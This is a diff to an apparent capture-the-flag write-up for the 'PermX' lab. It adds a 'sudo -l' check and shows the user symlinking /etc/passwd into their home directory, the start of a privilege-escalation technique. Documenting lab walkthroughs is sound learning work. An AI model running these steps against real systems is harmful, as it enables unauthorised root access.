@@ -216,7 +216,8 @@ mtz@permx:~$ cat user.txt
 ```
 ```bash
 # I will try sudo -l first if it doesn'T work we can try linpeas.sh
-
+mtz@permx:~$ sudo -l
+/opt/acl.sh
 mtz@permx:~$ ln -s /etc/passwd /home/mtz/test
 mtz@permx:~$ ls -l /home/mtz/test
 lrwxrwxrwx 1 mtz mtz 11 Sep 11 08:00 /home/mtz/test -> /etc/passwd
